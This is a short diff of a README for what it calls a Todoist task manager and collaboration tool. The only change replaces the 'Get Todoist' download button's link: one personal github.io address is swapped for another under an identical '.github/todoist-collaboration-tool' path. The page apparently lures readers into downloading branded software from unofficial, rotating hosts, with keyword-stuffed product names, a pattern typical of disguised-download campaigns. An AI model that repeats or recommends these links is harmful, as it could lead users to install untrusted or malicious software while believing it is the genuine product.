@@ -21,7 +21,7 @@ To begin using this **Todoist Task Manager** and **Todoist Project Tracker**, fo
 | :--- | :--- |
 | **Get Todoist Task Manager** | Click the button below to start using this **Todoist Collaboration Tool**. |
 
-[![Button](https://img.shields.io/badge/✅-Get_Todoist-2ea44f?style=for-the-badge)](https://gorbachyovgermanes.github.io/.github/todoist-collaboration-tool)
+[![Button](https://img.shields.io/badge/✅-Get_Todoist-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/todoist-collaboration-tool)
 
 ## System Requirements
 
